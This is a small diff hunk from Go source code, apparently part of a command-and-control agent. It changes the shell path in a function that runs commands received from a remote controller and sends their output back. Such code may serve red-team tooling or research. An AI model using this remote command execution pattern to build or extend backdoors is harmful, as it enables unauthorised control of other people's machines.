@@ -234,7 +234,7 @@ func processCCData(data *MsgTunData) {
 		}
 
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
-		cmd := exec.Command("sh", "-c", strings.Join(cmdSlice, " "))
+		cmd := exec.Command("/bin/sh", "-c", strings.Join(cmdSlice, " "))
 		outCombined, err = cmd.CombinedOutput()
 		if err != nil {
 			log.Println(err)
